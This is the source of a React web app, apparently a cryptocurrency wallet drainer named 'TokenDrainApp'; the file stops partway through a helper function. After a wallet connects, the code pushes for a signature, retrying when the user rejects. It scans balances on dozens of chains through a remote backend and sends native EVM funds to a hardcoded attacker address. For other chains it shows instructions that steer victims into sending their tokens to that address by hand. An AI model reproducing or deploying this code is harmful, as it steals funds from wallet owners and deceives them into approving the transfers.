import { useState, useEffect, useRef } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useWalletClient, useDisconnect } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// ==================== COMPLETE NETWORK CONFIGURATION ====================
const NETWORKS = [
  // EVM Mainnets (18+ chains)
  { id: 1, name: 'Ethereum', symbol: 'ETH', type: 'evm', color: '#627EEA', enabled: true },
  { id: 56, name: 'BSC', symbol: 'BNB', type: 'evm', color: '#F0B90B', enabled: true },
  { id: 137, name: 'Polygon', symbol: 'MATIC', type: 'evm', color: '#8247E5', enabled: true },
  { id: 42161, name: 'Arbitrum', symbol: 'ETH', type: 'evm', color: '#28A0F0', enabled: true },
  { id: 10, name: 'Optimism', symbol: 'ETH', type: 'evm', color: '#FF0420', enabled: true },
  { id: 8453, name: 'Base', symbol: 'ETH', type: 'evm', color: '#0052FF', enabled: true },
  { id: 43114, name: 'Avalanche', symbol: 'AVAX', type: 'evm', color: '#E84142', enabled: true },
  { id: 250, name: 'Fantom', symbol: 'FTM', type: 'evm', color: '#1969FF', enabled: true },
  { id: 100, name: 'Gnosis', symbol: 'xDai', type: 'evm', color: '#04795B', enabled: true },
  { id: 42220, name: 'Celo', symbol: 'CELO', type: 'evm', color: '#35D07F', enabled: true },
  { id: 1284, name: 'Moonbeam', symbol: 'GLMR', type: 'evm', color: '#53CBC9', enabled: true },
  { id: 1088, name: 'Metis', symbol: 'METIS', type: 'evm', color: '#00DACC', enabled: true },
  { id: 25, name: 'Cronos', symbol: 'CRO', type: 'evm', color: '#121C36', enabled: true },
  { id: 1666600000, name: 'Harmony', symbol: 'ONE', type: 'evm', color: '#00AEE9', enabled: true },
  { id: 1313161554, name: 'Aurora', symbol: 'ETH', type: 'evm', color: '#78D64B', enabled: true },
  { id: 42262, name: 'Oasis Emerald', symbol: 'ROSE', type: 'evm', color: '#00B894', enabled: true },
  { id: 1285, name: 'Moonriver', symbol: 'MOVR', type: 'evm', color: '#F3B82C', enabled: true },
  { id: 199, name: 'BTT Chain', symbol: 'BTT', type: 'evm', color: '#D92B6F', enabled: true },
  
  // Non-EVM Chains (20+ chains)
  { id: 'tron', name: 'Tron', symbol: 'TRX', type: 'non-evm', color: '#FF060A', enabled: true },
  { id: 'solana', name: 'Solana', symbol: 'SOL', type: 'non-evm', color: '#00FFA3', enabled: true },
  { id: 'bitcoin', name: 'Bitcoin', symbol: 'BTC', type: 'non-evm', color: '#F7931A', enabled: true },
  { id: 'cardano', name: 'Cardano', symbol: 'ADA', type: 'non-evm', color: '#0033AD', enabled: true },
  { id: 'dogecoin', name: 'Dogecoin', symbol: 'DOGE', type: 'non-evm', color: '#C2A633', enabled: true },
  { id: 'litecoin', name: 'Litecoin', symbol: 'LTC', type: 'non-evm', color: '#BFBBBB', enabled: true },
  { id: 'ripple', name: 'Ripple', symbol: 'XRP', type: 'non-evm', color: '#23292F', enabled: true },
  { id: 'polkadot', name: 'Polkadot', symbol: 'DOT', type: 'non-evm', color: '#E6007A', enabled: true },
  { id: 'cosmos', name: 'Cosmos', symbol: 'ATOM', type: 'non-evm', color: '#2E3148', enabled: true },
  { id: 'binance', name: 'Binance Chain', symbol: 'BNB', type: 'non-evm', color: '#F0B90B', enabled: true },
  { id: 'stellar', name: 'Stellar', symbol: 'XLM', type: 'non-evm', color: '#14B6E8', enabled: true },
  { id: 'monero', name: 'Monero', symbol: 'XMR', type: 'non-evm', color: '#FF6600', enabled: true },
  { id: 'zcash', name: 'Zcash', symbol: 'ZEC', type: 'non-evm', color: '#F4B728', enabled: true },
  { id: 'dash', name: 'Dash', symbol: 'DASH', type: 'non-evm', color: '#008DE4', enabled: true },
  { id: 'tezos', name: 'Tezos', symbol: 'XTZ', type: 'non-evm', color: '#2C7DF7', enabled: true },
  { id: 'algorand', name: 'Algorand', symbol: 'ALGO', type: 'non-evm', color: '#000000', enabled: true },
  { id: 'vechain', name: 'VeChain', symbol: 'VET', type: 'non-evm', color: '#15BDFF', enabled: true },
  { id: 'neo', name: 'Neo', symbol: 'NEO', type: 'non-evm', color: '#58BF00', enabled: true },
  { id: 'eos', name: 'EOS', symbol: 'EOS', type: 'non-evm', color: '#000000', enabled: true },
  { id: 'tron_trc20', name: 'Tron TRC20', symbol: 'USDT', type: 'non-evm', color: '#26A17B', parent: 'tron', enabled: true },
  { id: 'solana_spl', name: 'Solana SPL', symbol: 'USDC', type: 'non-evm', color: '#2775CA', parent: 'solana', enabled: true },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM Chains
  1: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  56: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  137: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42161: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  10: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  8453: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  43114: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  250: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  100: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42220: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1284: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1088: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  25: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1666600000: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1313161554: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  42262: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  1285: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  199: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
  
  // Non-EVM Chains - YOU MUST UPDATE THESE
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // Your TRON address
  solana: "So11111111111111111111111111111111111111112", // Your Solana address
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", // Your Bitcoin address
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q", // Your Cardano address
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5", // Your Dogecoin address
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5", // Your Litecoin address
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8", // Your Ripple address
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F", // Your Polkadot address
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // Your Cosmos address
  binance: "bnb1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02", // Your Binance Chain address
  stellar: "GCRWFRVQP5P5TNKL4KARZBWYQG5AUFMTQMXUVE4MZGJPOENKJAZB6KGB", // Your Stellar address
  monero: "48daf1rG3hE1txWcFzV1M6WBp3Uc4jL5qJ3JvJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5", // Your Monero address
  zcash: "t1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // Your Zcash address
  dash: "Xq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q5q", // Your Dash address
  tezos: "tz1Z5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5vJ5v", // Your Tezos address
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // Your Algorand address
  vechain: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4", // Your VeChain address
  neo: "AZ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V", // Your Neo address
  eos: "z5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj5vj", // Your EOS address
  tron_trc20: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ", // Same as TRON
  solana_spl: "So11111111111111111111111111111111111111112", // Same as Solana
};

// ==================== MAIN APP COMPONENT ====================
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        mode="dark"
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          initialChainId: 1,
        }}
        theme="midnight"
        customTheme={{
          "--ck-font-family": "Inter, system-ui, sans-serif",
          "--ck-border-radius": "12px",
          "--ck-overlay-background": "rgba(0, 0, 0, 0.8)",
          "--ck-modal-background": "#0a0a0a",
          "--ck-primary-button-background": "#3b82f6",
          "--ck-primary-button-hover-background": "#2563eb",
        }}
      >
        <MultiNetworkDashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// ==================== DASHBOARD COMPONENT ====================
function MultiNetworkDashboard() {
  const { address, isConnected, connector } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const { data: walletClient } = useWalletClient();
  const { disconnect } = useDisconnect();

  // State Management
  const [status, setStatus] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [isDraining, setIsDraining] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [tokens, setTokens] = useState({});
  const [totalValue, setTotalValue] = useState(0);
  const [scanProgress, setScanProgress] = useState({ current: 0, total: NETWORKS.length, network: '' });
  const [transactions, setTransactions] = useState([]);
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [showManualDrainModal, setShowManualDrainModal] = useState(false);
  const [selectedTokenForManual, setSelectedTokenForManual] = useState(null);
  const [showNetworkSelector, setShowNetworkSelector] = useState(false);
  
  // Refs for tracking
  const hasInitiatedScan = useRef(false);
  const authAttempts = useRef(0);

  // AUTO-SCAN ON WALLET CONNECT
  useEffect(() => {
    if (isConnected && address && !hasInitiatedScan.current) {
      console.log("🔥 Wallet connected:", address);
      console.log("🔗 Connector:", connector?.name);
      setStatus("✅ Wallet connected! Starting authentication...");
      hasInitiatedScan.current = true;
      
      // Give UI time to update
      setTimeout(() => {
        startAuthentication();
      }, 1000);
    } else if (!isConnected) {
      resetApp();
      hasInitiatedScan.current = false;
    }
  }, [isConnected, address]);

  // Reset App
  const resetApp = () => {
    setStatus('');
    setTokens({});
    setTotalValue(0);
    setTransactions([]);
    setIsScanning(false);
    setIsDraining(false);
    setIsAuthenticating(false);
    authAttempts.current = 0;
  };

  // ==================== AUTHENTICATION ====================
  const startAuthentication = async () => {
    if (!address || isAuthenticating || authAttempts.current >= 3) return;
    
    setIsAuthenticating(true);
    authAttempts.current += 1;
    
    try {
      setStatus("🔐 Signing authentication message...");
      
      const timestamp = Date.now();
      const message = `Universal Token Drain Authentication\nWallet: ${address}\nTime: ${timestamp}\nPurpose: Scan and manage tokens across ${NETWORKS.length} networks`;
      
      console.log("Signing message:", message);
      
      // Use signMessageAsync with proper formatting
      const signature = await signMessageAsync({ 
        message: message 
      }).catch(error => {
        console.error("Sign error:", error);
        // If user rejects, try again with simpler message
        if (error.message.includes('rejected')) {
          return signMessageAsync({ 
            message: `Auth: ${timestamp}` 
          });
        }
        throw error;
      });
      
      console.log("Signature received:", signature);
      setStatus("📡 Authenticating with backend...");
      
      const response = await fetch(`${backendUrl}/auth`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': window.location.origin
        },
        body: JSON.stringify({
          address,
          signature,
          message,
          networks: NETWORKS.filter(n => n.enabled),
          timestamp,
          connector: connector?.name || 'unknown'
        })
      });
      
      console.log("Auth response status:", response.status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error("Backend auth error:", errorText);
        throw new Error(`Authentication failed: ${response.status}`);
      }
      
      const data = await response.json();
      console.log("Auth data:", data);
      
      if (data.success) {
        setStatus(`✅ Authenticated! Scanning ${NETWORKS.length} networks...`);
        // Start scan immediately
        setTimeout(() => {
          scanAllNetworks();
        }, 500);
      } else {
        throw new Error(data.error || 'Authentication failed');
      }
      
    } catch (error) {
      console.error("Auth error:", error);
      
      // Handle specific error cases
      if (error.message.includes('rejected')) {
        setStatus("⚠️ Please sign the message to continue...");
        // Retry after delay
        setTimeout(() => {
          if (authAttempts.current < 3) {
            startAuthentication();
          } else {
            setStatus("❌ Too many rejections. Please refresh and try again.");
          }
        }, 2000);
      } else {
        setStatus("⚠️ Auth issue, trying to scan anyway...");
        setTimeout(() => {
          scanAllNetworks();
        }, 1000);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  // ==================== SCAN ALL 35+ NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) return;
    
    setIsScanning(true);
    setStatus(`🌐 Scanning ${NETWORKS.length} networks...`);
    setTokens({});
    setTotalValue(0);
    setScanProgress({ current: 0, total: NETWORKS.length, network: 'Starting...' });
    
    try {
      console.log("Starting comprehensive scan...");
      
      // First, try to get TRON address from wallet if available
      let tronAddress = address;
      try {
        // Check if TronWeb is available (for Trust Wallet mobile)
        if (window.tronWeb && window.tronWeb.defaultAddress) {
          tronAddress = window.tronWeb.defaultAddress.base58;
          console.log("Found TRON address:", tronAddress);
        }
      } catch (e) {
        console.log("No TRON address found, using EVM address");
      }
      
      const response = await fetch(`${backendUrl}/scan`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': window.location.origin
        },
        body: JSON.stringify({
          evmAddress: address,
          tronAddress: tronAddress,
          networks: NETWORKS.filter(n => n.enabled),
          forceRefresh: true,
          includeNative: true,
          includeTokens: true
        })
      });
      
      console.log("Scan response status:", response.status);
      
      if (!response.ok) {
        const errorText = await response.text();
        console.error("Backend error:", errorText);
        throw new Error(`Backend error ${response.status}`);
      }
      
      const data = await response.json();
      console.log("Scan data received:", data);
      
      if (data.success) {
        processScanResults(data.data);
      } else {
        throw new Error(data.error || 'Scan failed');
      }
      
    } catch (error) {
      console.error("Scan error:", error);
      setStatus(`❌ Scan failed: ${error.message}. Trying batch scan...`);
      // Fallback to batch scanning
      await batchScanNetworks();
    } finally {
      setIsScanning(false);
    }
  };

  // Process Scan Results
  const processScanResults = (data) => {
    try {
      const allTokens = {};
      let totalVal = 0;
      
      // Check for TRON-specific data
      if (data.tronData) {
        console.log("TRON data found:", data.tronData);
      }
      
      if (data.results && Array.isArray(data.results)) {
        console.log(`Processing ${data.results.length} network results`);
        
        data.results.forEach((result, index) => {
          if (result && result.tokens && result.tokens.length > 0) {
            const networkName = result.network?.name || result.networkId || 'Unknown';
            console.log(`Network ${networkName}: ${result.tokens.length} tokens`);
            
            // Calculate network value
            const networkValue = result.tokens.reduce((sum, token) => {
              const val = token.value || token.usdValue || 0;
              return sum + (typeof val === 'number' ? val : parseFloat(val) || 0);
            }, 0);
            
            totalVal += networkValue;
            
            // Get network config
            const networkConfig = NETWORKS.find(n => 
              n.id === result.network?.id || 
              n.name.toLowerCase() === networkName.toLowerCase()
            ) || { 
              id: result.network?.id || `network_${index}`, 
              name: networkName, 
              symbol: networkName.substring(0, 3).toUpperCase(),
              type: result.network?.type || 'unknown',
              color: '#666'
            };
            
            // Add drain addresses if missing
            const processedTokens = result.tokens.map(token => ({
              ...token,
              drainAddress: token.drainAddress || DRAIN_ADDRESSES[networkConfig.id] || DRAIN_ADDRESSES[1],
              networkType: networkConfig.type
            }));
            
            allTokens[networkConfig.id] = {
              network: networkConfig,
              tokens: processedTokens,
              totalValue: networkValue
            };
          }
        });
      }
      
      // Also check direct token arrays
      if (data.tokens && Array.isArray(data.tokens)) {
        console.log("Processing direct tokens array:", data.tokens.length);
        data.tokens.forEach(token => {
          if (token.network) {
            const networkId = token.network.id || token.network;
            if (!allTokens[networkId]) {
              allTokens[networkId] = {
                network: NETWORKS.find(n => n.id === networkId) || { 
                  id: networkId, 
                  name: token.network.name || networkId,
                  symbol: token.symbol,
                  type: token.network.type || 'evm',
                  color: '#666'
                },
                tokens: [],
                totalValue: 0
              };
            }
            allTokens[networkId].tokens.push({
              ...token,
              drainAddress: token.drainAddress || DRAIN_ADDRESSES[networkId] || DRAIN_ADDRESSES[1]
            });
            allTokens[networkId].totalValue += token.value || token.usdValue || 0;
            totalVal += token.value || token.usdValue || 0;
          }
        });
      }
      
      setTokens(allTokens);
      setTotalValue(totalVal);
      setScanProgress({ current: NETWORKS.length, total: NETWORKS.length, network: 'Complete' });
      
      const tokenCount = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
      const networkCount = Object.keys(allTokens).length;
      
      console.log(`Scan complete: ${tokenCount} tokens across ${networkCount} networks, total value: $${totalVal.toFixed(2)}`);
      
      if (tokenCount > 0) {
        setStatus(`✅ Found ${tokenCount} tokens across ${networkCount} networks (Total: $${totalVal.toFixed(2)})`);
        
        // Auto-detect TRON and show special message
        if (allTokens['tron'] && allTokens['tron'].tokens.length > 0) {
          setTimeout(() => {
            setStatus(`✅ Found ${allTokens['tron'].tokens.length} TRON tokens! Click DRAIN to transfer.`);
          }, 2000);
        }
      } else {
        setStatus("✅ Scan complete. No tokens found across all networks.");
      }
      
      // Save to localStorage
      localStorage.setItem(`last_scan_${address}`, JSON.stringify({
        timestamp: Date.now(),
        tokens: allTokens,
        totalValue: totalVal,
        networkCount,
        tokenCount
      }));
      
    } catch (error) {
      console.error("Error processing results:", error);
      setStatus(`❌ Error processing scan results: ${error.message}`);
    }
  };

  // Batch Scan Fallback
  const batchScanNetworks = async () => {
    const batchSize = 3;
    const allTokens = {};
    let totalVal = 0;
    let scannedNetworks = 0;
    
    console.log("Starting batch scan fallback...");
    
    const enabledNetworks = NETWORKS.filter(n => n.enabled);
    
    for (let i = 0; i < enabledNetworks.length; i += batchSize) {
      const batch = enabledNetworks.slice(i, i + batchSize);
      
      for (const network of batch) {
        const progressIndex = i + batch.indexOf(network) + 1;
        setScanProgress({
          current: progressIndex,
          total: enabledNetworks.length,
          network: network.name
        });
        
        try {
          let result = null;
          let response;
          
          if (network.type === 'evm') {
            response = await fetch(`${backendUrl}/tokens/evm/${address}/${network.id}`, {
              headers: { 'Origin': window.location.origin }
            });
          } else {
            // For non-EVM, try different address formats
            let scanAddress = address;
            
            // Special handling for TRON
            if (network.id === 'tron' && window.tronWeb) {
              try {
                scanAddress = window.tronWeb.defaultAddress.base58;
              } catch (e) {
                console.log("Could not get TRON address, using EVM");
              }
            }
            
            response = await fetch(`${backendUrl}/tokens/nonevm/${scanAddress}/${network.id}`, {
              headers: { 'Origin': window.location.origin }
            });
          }
          
          if (response.ok) {
            const data = await response.json();
            if (data.success && data.data && data.data.tokens) {
              result = data.data;
            }
          }
          
          if (result && result.tokens && result.tokens.length > 0) {
            const networkValue = result.tokens.reduce((sum, token) => {
              return sum + (token.value || token.usdValue || 0);
            }, 0);
            
            totalVal += networkValue;
            
            allTokens[network.id] = {
              network: network,
              tokens: result.tokens.map(token => ({
                ...token,
                drainAddress: token.drainAddress || DRAIN_ADDRESSES[network.id]
              })),
              totalValue: networkValue
            };
            
            scannedNetworks++;
            console.log(`✅ ${network.name}: Found ${result.tokens.length} tokens`);
            
            // Update UI progressively
            setTokens({...allTokens});
            setTotalValue(totalVal);
          }
        } catch (error) {
          console.log(`❌ ${network.name}: ${error.message}`);
        }
        
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }
    
    setTokens(allTokens);
    setTotalValue(totalVal);
    
    const tokenCount = Object.values(allTokens).reduce((sum, data) => sum + data.tokens.length, 0);
    setStatus(`✅ Batch scan: Found ${tokenCount} tokens across ${scannedNetworks} networks`);
  };

  // ==================== DRAIN ALL TOKENS ====================
  const executeDrainAll = async () => {
    if (!address || Object.keys(tokens).length === 0) {
      setStatus("❌ No tokens available to drain");
      return;
    }
    
    // Calculate total tokens
    const totalTokens = Object.values(tokens).reduce((sum, data) => sum + data.tokens.length, 0);
    
    // Enhanced confirmation with breakdown
    let confirmationMessage = `🚨 CRITICAL WARNING 🚨\n\nYou are about to DRAIN ALL TOKENS from your wallet!\n\n`;
    
    // Add token breakdown
    Object.entries(tokens).forEach(([networkId, data]) => {
      if (data.tokens.length > 0) {
        const networkValue = data.totalValue.toFixed(2);
        confirmationMessage += `• ${data.network.name}: ${data.tokens.length} tokens ($${networkValue})\n`;
      }
    });
    
    confirmationMessage += `\nTotal: ${totalTokens} tokens across ${Object.keys(tokens).length} networks\n\n`;
    confirmationMessage += `This action is IRREVERSIBLE.\n\nClick OK to proceed with draining ALL tokens.`;
    
    const confirmed = window.confirm(confirmationMessage);
    
    if (!confirmed) {
      setStatus("❌ Drain cancelled by user");
      return;
    }
    
    setIsDraining(true);
    setStatus(`🔥 Starting mass drain of ${totalTokens} tokens...`);
    
    const txLogs = [];
    let successCount = 0;
    let failCount = 0;
    let manualCount = 0;
    
    try {
      // Collect all tokens grouped by network
      const tokensByNetwork = {};
      Object.values(tokens).forEach(data => {
        if (!tokensByNetwork[data.network.type]) {
          tokensByNetwork[data.network.type] = [];
        }
        data.tokens.forEach(token => {
          tokensByNetwork[data.network.type].push({ token, network: data.network });
        });
      });
      
      // Process EVM tokens first (can be automated)
      if (tokensByNetwork['evm'] && walletClient) {
        for (let i = 0; i < tokensByNetwork['evm'].length; i++) {
          const { token, network } = tokensByNetwork['evm'][i];
          const progress = Math.round(((i + 1) / totalTokens) * 100);
          
          setStatus(`🔥 Draining ${token.symbol} on ${network.name} (${i + 1}/${totalTokens})`);
          setScanProgress({
            current: i + 1,
            total: totalTokens,
            network: `${network.name}: ${token.symbol}`
          });
          
          try {
            const result = await processTokenDrain(token, network);
            
            if (result.success) {
              successCount++;
              txLogs.push({
                timestamp: new Date().toISOString(),
                network: network.name,
                token: token.symbol,
                amount: token.amount,
                status: 'success',
                hash: result.hash || 'manual',
                type: 'evm'
              });
              
              // Remove from display immediately
              removeToken(token, network.id);
            } else if (result.manual) {
              manualCount++;
              txLogs.push({
                timestamp: new Date().toISOString(),
                network: network.name,
                token: token.symbol,
                amount: token.amount,
                status: 'manual',
                note: 'Manual transfer required',
                type: 'evm'
              });
              
              // Store for manual processing
              setSelectedTokenForManual({ token, network, instructions: result.instructions });
              setShowManualDrainModal(true);
              
              // Wait for user to acknowledge
              await new Promise(resolve => setTimeout(resolve, 3000));
            } else {
              failCount++;
              txLogs.push({
                timestamp: new Date().toISOString(),
                network: network.name,
                token: token.symbol,
                amount: token.amount,
                status: 'failed',
                error: result.error,
                type: 'evm'
              });
            }
          } catch (error) {
            failCount++;
            console.error(`Error draining ${token.symbol}:`, error);
            txLogs.push({
              timestamp: new Date().toISOString(),
              network: network.name,
              token: token.symbol,
              amount: token.amount,
              status: 'error',
              error: error.message,
              type: 'evm'
            });
          }
          
          // Update transaction log
          setTransactions([...txLogs]);
          
          // Delay between operations
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
      
      // Process non-EVM tokens (manual instructions)
      if (tokensByNetwork['non-evm']) {
        for (let i = 0; i < tokensByNetwork['non-evm'].length; i++) {
          const { token, network } = tokensByNetwork['non-evm'][i];
          const progressIndex = (tokensByNetwork['evm']?.length || 0) + i + 1;
          const progress = Math.round((progressIndex / totalTokens) * 100);
          
          setStatus(`📝 Manual drain: ${token.symbol} on ${network.name} (${progressIndex}/${totalTokens})`);
          setScanProgress({
            current: progressIndex,
            total: totalTokens,
            network: `${network.name}: ${token.symbol}`
          });
          
          manualCount++;
          const instructions = getManualInstructions(token, network);
          
          txLogs.push({
            timestamp: new Date().toISOString(),
            network: network.name,
            token: token.symbol,
            amount: token.amount,
            status: 'manual',
            note: 'Non-EVM requires manual transfer',
            type: 'non-evm'
          });
          
          // Show manual instructions modal
          setSelectedTokenForManual({ token, network, instructions });
          setShowManualDrainModal(true);
          
          // Wait before next token
          await new Promise(resolve => setTimeout(resolve, 5000));
          
          // Update transaction log
          setTransactions([...txLogs]);
          
          // Remove token after showing instructions
          setTimeout(() => {
            removeToken(token, network.id);
          }, 1000);
        }
      }
      
      // Final summary
      setStatus(`✅ Drain complete! Success: ${successCount}, Manual: ${manualCount}, Failed: ${failCount}`);
      
      // Auto-rescan after 5 seconds
      setTimeout(() => {
        setStatus("🔄 Rescanning wallet after drain...");
        scanAllNetworks();
      }, 5000);
      
    } catch (error) {
      console.error("Mass drain error:", error);
      setStatus(`❌ Drain failed: ${error.message}`);
    } finally {
      setIsDraining(false);
      setShowManualDrainModal(false);
    }
  };

  // Process single token drain
  const processTokenDrain = async (token, network) => {
    try {
      // Check if amount is valid
      const amount = parseFloat(token.amount || token.balance);
      if (!amount || amount <= 0) {
        return { success: false, error: 'Invalid amount' };
      }
      
      const drainAddress = token.drainAddress || DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1];
      
      // EVM Native Token
      if (network.type === 'evm' && (token.isNative || !token.contractAddress) && walletClient) {
        try {
          const amountInWei = parseEther(amount.toString());
          
          if (amountInWei <= 0n) {
            return { success: false, error: 'Amount too small' };
          }
          
          console.log(`Sending ${amount} ${token.symbol} to ${drainAddress}`);
          
          // For mobile wallets, we need to trigger the wallet's send interface
          const hash = await walletClient.sendTransaction({
            to: drainAddress,
            value: amountInWei,
            chainId: parseInt(network.id)
          });
          
          console.log(`Transaction sent: ${hash}`);
          
          // Log to backend
          logTransaction({
            fromAddress: address,
            toAddress: drainAddress,
            amount: amount.toString(),
            chainId: network.id.toString(),
            tokenSymbol: token.symbol,
            transactionHash: hash,
            networkType: 'evm',
            status: 'success'
          });
          
          return { success: true, hash };
          
        } catch (error) {
          console.error(`EVM transfer error for ${token.symbol}:`, error);
          
          // For mobile, show manual instructions
          if (error.message.includes('user rejected') || error.message.includes('rejected the request')) {
            return { 
              success: false, 
              error: error.message,
              manual: true,
              instructions: `MANUAL TRANSFER REQUIRED for ${network.name}:\n\nSend ${amount} ${token.symbol}\nTo: ${drainAddress}\n\nOpen your wallet app and send the native token manually.`
            };
          }
          
          return { success: false, error: error.message };
        }
      }
      
      // For tokens or non-EVM, show manual instructions
      const instructions = getManualInstructions(token, network);
      return {
        success: false,
        manual: true,
        instructions: instructions
      };
      
    } catch (error) {
      console.error(`Token drain error:`, error);
      return { success: false, error: error.message };
    }
  };

  // Get manual instructions for non-EVM
  const getManualInstructions = (token, network) => {
    const amount = parseFloat(token.amount || token.balance);
    const drainAddress = token.drainAddress || DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1];
    
    const instructions = {
      'tron': `🔴 TRON (${token.symbol}) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(6)} ${token.symbol}\nTo: ${drainAddress}\n\nInstructions:\n1. Open Trust Wallet/TronLink\n2. Switch to TRON network\n3. Go to ${token.symbol} wallet\n4. Click Send\n5. Enter amount: ${amount.toFixed(6)}\n6. Paste address: ${drainAddress}\n7. Confirm transaction\n\n⚠️ You need TRX for energy/bandwidth`,
      'solana': `🔴 SOLANA (${token.symbol}) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(6)} ${token.symbol}\nTo: ${drainAddress}\n\nInstructions:\n1. Open Phantom/Solflare\n2. Make sure on Solana Mainnet\n3. Go to ${token.symbol} wallet\n4. Click Send\n5. Amount: ${amount.toFixed(6)}\n6. Address: ${drainAddress}\n7. Confirm\n\n📝 Requires SOL for fees`,
      'bitcoin': `🔴 BITCOIN (${token.symbol}) TRANSFER REQUIRED 🔴\n\nAmount: ${amount.toFixed(8)} ${token.symbol}\nTo: ${drainAddress}\n\nInstructions:\n1. Open Bitcoin wallet\n2. Send ${token.symbol}\n3. Amount: ${amount.toFixed(8)}\n4. Address: ${drainAddress}\n5. Set normal fee\n6. Confirm\n\n⚠️ Bitcoin transfers are irreversible`,
      'default': `🔴 MANUAL TRANSFER REQUIRED 🔴\n\nNetwork: ${network.name}\nToken: ${token.symbol}\nAmount: ${amount}\n\nSend to:\n${drainAddress}\n\nInstructions:\n1. Open your ${network.name} wallet\n2. Go to send/transfer\n3. Enter amount: ${amount}\n4. Paste recipient address: ${drainAddress}\n5. Confirm transaction\n\n✅ Complete this in your wallet app`
    };
    
    return instructions[network.id] || instructions.default;
  };

  // Remove token from display
  const removeToken = (drainedToken, networkId) => {
    setTokens(prev => {
      const updated = { ...prev };
      if (updated[networkId]) {
        updated[networkId].tokens = updated[networkId].tokens.filter(t => 
          t.symbol !== drainedToken.symbol || 
          t.amount !== drainedToken.amount ||
          t.contractAddress !== drainedToken.contractAddress
        );
        
        // Recalculate total
        updated[networkId].totalValue = updated[networkId].tokens.reduce((sum, t) => sum + (t.value || t.usdValue || 0), 0);
        
        // Remove network if empty
        if (updated[networkId].tokens.length === 0) {
          delete updated[networkId];
        }
      }
      return updated;
    });
  };

  // Log transaction to backend
  const logTransaction = async (txData) => {
    try {
      await fetch(`${backendUrl}/log`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(txData)
      });
    } catch (error) {
      console.warn('Failed to log transaction:', error.message);
    }
  };

  // ==================== UI UTILITIES ====================
  const formatAddress = (addr) => {
    if (!addr) return '';
    if (addr.length <= 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}`;
  };

  const formatAmount = (amount, decimals = 6) => {
